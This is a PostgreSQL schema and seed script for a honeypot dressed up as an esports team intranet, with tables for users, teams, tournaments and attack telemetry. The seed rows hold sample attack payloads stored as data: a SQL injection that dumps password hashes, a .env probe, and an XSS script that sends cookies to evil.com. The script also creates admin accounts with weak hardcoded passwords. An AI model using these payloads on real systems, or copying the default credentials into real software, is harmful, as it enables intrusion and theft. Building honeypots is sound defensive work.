-- =============================================================================
-- VIGILANCE Honeypot & Nowhere Esports Intranet — Master PostgreSQL Schema
-- Database: PostgreSQL 15+
-- =============================================================================

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- ── 1. Users Table (Native Auth replacing proprietary Supabase Auth) ───────────
CREATE TABLE IF NOT EXISTS users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(50) NOT NULL DEFAULT 'player' CHECK (role IN ('admin', 'staff', 'analyst', 'player')),
    department VARCHAR(100) DEFAULT 'Esports Operations',
    full_name VARCHAR(150) NOT NULL,
    avatar_url VARCHAR(500),
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
CREATE INDEX IF NOT EXISTS idx_users_role ON users(role);

-- ── 2. User Profiles ─────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS profiles (
    user_id UUID PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
    bio TEXT,
    title VARCHAR(100),
    phone VARCHAR(50),
    emergency_contact VARCHAR(100),
    status VARCHAR(50) DEFAULT 'Active',
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- ── 3. Teams ─────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS teams (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name VARCHAR(100) NOT NULL,
    tag VARCHAR(10) NOT NULL UNIQUE,
    game VARCHAR(50) NOT NULL,
    region VARCHAR(50) DEFAULT 'North America',
    logo_url VARCHAR(500),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- ── 4. Players ───────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS players (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    team_id UUID REFERENCES teams(id) ON DELETE SET NULL,
    handle VARCHAR(50) NOT NULL,
    real_name VARCHAR(100) NOT NULL,
    role VARCHAR(50) NOT NULL,
    age INT,
    nationality VARCHAR(50),
    photo_url VARCHAR(500),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_players_team_id ON players(team_id);

-- ── 5. Tournaments ───────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS tournaments (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name VARCHAR(150) NOT NULL,
    game VARCHAR(50) NOT NULL,
    prize_pool NUMERIC(12, 2) DEFAULT 0.00,
    status VARCHAR(50) DEFAULT 'upcoming' CHECK (status IN ('upcoming', 'ongoing', 'completed', 'cancelled')),
    start_date DATE NOT NULL,
    end_date DATE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- ── 6. Matches ───────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS matches (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    tournament_id UUID REFERENCES tournaments(id) ON DELETE CASCADE,
    team_a_id UUID REFERENCES teams(id) ON DELETE SET NULL,
    team_b_id UUID REFERENCES teams(id) ON DELETE SET NULL,
    score_a INT DEFAULT 0,
    score_b INT DEFAULT 0,
    status VARCHAR(50) DEFAULT 'scheduled' CHECK (status IN ('scheduled', 'live', 'completed')),
    scheduled_at TIMESTAMP WITH TIME ZONE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_matches_tournament ON matches(tournament_id);

-- ── 7. Announcements ─────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS announcements (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    title VARCHAR(200) NOT NULL,
    content TEXT NOT NULL,
    author_id UUID REFERENCES users(id) ON DELETE SET NULL,
    priority VARCHAR(20) DEFAULT 'normal' CHECK (priority IN ('low', 'normal', 'urgent')),
    category VARCHAR(50) DEFAULT 'General',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- ── 8. Notifications ─────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS notifications (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id UUID REFERENCES users(id) ON DELETE CASCADE,
    title VARCHAR(150) NOT NULL,
    message TEXT NOT NULL,
    read BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_notifications_user_id ON notifications(user_id);

-- ── 9. Audit Events ──────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS audit_events (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    action VARCHAR(100) NOT NULL,
    user_id UUID REFERENCES users(id) ON DELETE SET NULL,
    resource VARCHAR(100) NOT NULL,
    details JSONB DEFAULT '{}'::jsonb,
    ip_address VARCHAR(45),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- ── 10. Security Attacks (Honeypot Telemetry) ─────────────────────────────────
CREATE TABLE IF NOT EXISTS attacks (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    source_ip VARCHAR(45) NOT NULL,
    source_port INT DEFAULT 0,
    method VARCHAR(10) NOT NULL,
    path VARCHAR(1000) NOT NULL,
    protocol VARCHAR(20) DEFAULT 'HTTP/1.1',
    attack_type VARCHAR(100) NOT NULL,
    payload TEXT,
    severity INT NOT NULL CHECK (severity BETWEEN 1 AND 10),
    user_agent TEXT,
    signatures TEXT[] DEFAULT '{}',
    geo_country VARCHAR(100) DEFAULT 'Unknown',
    geo_city VARCHAR(100) DEFAULT 'Unknown',
    geo_lat NUMERIC(9, 6) DEFAULT 0.0,
    geo_lon NUMERIC(9, 6) DEFAULT 0.0,
    blocked BOOLEAN DEFAULT FALSE,
    status VARCHAR(50) DEFAULT 'active' CHECK (status IN ('active', 'investigating', 'mitigated')),
    mitigation_action VARCHAR(100),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_attacks_timestamp ON attacks(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_attacks_source_ip ON attacks(source_ip);
CREATE INDEX IF NOT EXISTS idx_attacks_severity ON attacks(severity DESC);
CREATE INDEX IF NOT EXISTS idx_attacks_attack_type ON attacks(attack_type);
CREATE INDEX IF NOT EXISTS idx_attacks_geo_country ON attacks(geo_country);

-- ── 11. Seed Data ────────────────────────────────────────────────────────────

-- Admin user (password: 'admin123' bcrypt hash: $2a$10$wK5F1d2bZ... using standard bcrypt)
-- Using pgcrypto's crypt() with bf blowfish algorithm
INSERT INTO users (id, email, password_hash, role, department, full_name)
VALUES (
    'a0000000-0000-0000-0000-000000000001',
    'admin@nowhere.gg',
    crypt('admin123', gen_salt('bf', 10)),
    'admin',
    'Security Operations',
    'Chief Security Officer'
) ON CONFLICT (email) DO NOTHING;

INSERT INTO users (id, email, password_hash, role, department, full_name)
VALUES (
    'a0000000-0000-0000-0000-000000000002',
    'analyst@nowhere.gg',
    crypt('analyst123', gen_salt('bf', 10)),
    'analyst',
    'Threat Intelligence',
    'Lead Security Analyst'
) ON CONFLICT (email) DO NOTHING;

INSERT INTO profiles (user_id, bio, title, status)
VALUES
    ('a0000000-0000-0000-0000-000000000001', 'Head of Security & Infrastructure at Nowhere Esports.', 'CSO', 'Active'),
    ('a0000000-0000-0000-0000-000000000002', 'SOC Analyst monitoring real-time intrusion events.', 'Security Analyst', 'Active')
ON CONFLICT (user_id) DO NOTHING;

-- Seed Teams
INSERT INTO teams (id, name, tag, game, region)
VALUES
    ('b0000000-0000-0000-0000-000000000001', 'Nowhere Valorant', 'NWH-VAL', 'Valorant', 'Americas'),
    ('b0000000-0000-0000-0000-000000000002', 'Nowhere Counter-Strike', 'NWH-CS', 'CS2', 'Europe'),
    ('b0000000-0000-0000-0000-000000000003', 'Nowhere League of Legends', 'NWH-LOL', 'League of Legends', 'Korea')
ON CONFLICT (tag) DO NOTHING;

-- Seed Players
INSERT INTO players (team_id, handle, real_name, role, age, nationality)
VALUES
    ('b0000000-0000-0000-0000-000000000001', 'Ghost', 'Alex Chen', 'Duelist', 21, 'USA'),
    ('b0000000-0000-0000-0000-000000000001', 'Cipher', 'Elena Rostova', 'Sentinel', 23, 'Canada'),
    ('b0000000-0000-0000-0000-000000000002', 'Viper', 'Lukas Weber', 'Entry Fragger', 24, 'Germany'),
    ('b0000000-0000-0000-0000-000000000003', 'FakerX', 'Min-jun Kim', 'Mid Laner', 20, 'South Korea');

-- Seed Tournaments
INSERT INTO tournaments (id, name, game, prize_pool, status, start_date, end_date)
VALUES
    ('c0000000-0000-0000-0000-000000000001', 'VCT Masters Berlin 2026', 'Valorant', 1000000.00, 'ongoing', CURRENT_DATE - INTERVAL '2 days', CURRENT_DATE + INTERVAL '5 days'),
    ('c0000000-0000-0000-0000-000000000002', 'IEM Katowice Major', 'CS2', 1250000.00, 'upcoming', CURRENT_DATE + INTERVAL '10 days', CURRENT_DATE + INTERVAL '20 days');

-- Seed Announcements
INSERT INTO announcements (title, content, author_id, priority, category)
VALUES
    ('System Security Alert: Active Probe Monitoring', 'All personnel please be aware that intrusion detection traps are active across public endpoints.', 'a0000000-0000-0000-0000-000000000001', 'urgent', 'Security'),
    ('Welcome to Nowhere Esports Intranet', 'The internal tournament and team management system is fully operational on PostgreSQL 15.', 'a0000000-0000-0000-0000-000000000001', 'normal', 'General');

-- Seed Baseline Attacks for SOC Dashboard
INSERT INTO attacks (source_ip, source_port, method, path, protocol, attack_type, payload, severity, user_agent, signatures, geo_country, geo_city, geo_lat, geo_lon, blocked, status)
VALUES
    ('185.220.101.5', 43892, 'GET', '/api/v1/users?id=1%20UNION%20SELECT%20null,email,password_hash%20FROM%20users--', 'HTTP/1.1', 'SQL_INJECTION', 'UNION SELECT null,email,password_hash FROM users--', 9, 'sqlmap/1.7.2#stable', ARRAY['SQLi: UNION SELECT', 'Scanner: sqlmap signature'], 'Germany', 'Frankfurt', 50.1109, 8.6821, TRUE, 'mitigated'),
    ('45.155.205.233', 51204, 'POST', '/api/v1/auth/login', 'HTTP/1.1', 'BRUTE_FORCE', '{"email": "admin@nowhere.gg", "password": "password123"}', 7, 'python-requests/2.31.0', ARRAY['Auth: Rapid Credential Stuffing'], 'Russia', 'Moscow', 55.7558, 37.6173, TRUE, 'mitigated'),
    ('103.203.57.18', 38291, 'GET', '/.env', 'HTTP/1.1', 'RECONNAISSANCE', '/.env', 8, 'Mozilla/5.0 (compatible; Nmap Scripting Engine)', ARRAY['Decoy Probe: Sensitive File Access (.env)', 'Scanner: Nmap NSE'], 'China', 'Shanghai', 31.2304, 121.4737, TRUE, 'active'),
    ('194.26.29.112', 49201, 'GET', '/actuator/health', 'HTTP/1.1', 'CANARY_TRAP', '/actuator/health', 8, 'Go-http-client/1.1', ARRAY['Decoy Trap: Spring Actuator Probe'], 'Netherlands', 'Amsterdam', 52.3676, 4.9041, TRUE, 'active'),
    ('89.248.165.74', 60123, 'GET', '/api/v1/profile?bio=<script>document.location="http://evil.com/steal?c="+document.cookie</script>', 'HTTP/1.1', 'CROSS_SITE_SCRIPTING', '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', 8, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', ARRAY['XSS: Malicious script tags', 'XSS: Cookie Exfiltration Attempt'], 'Seychelles', 'Victoria', -4.6191, 55.4513, TRUE, 'active');
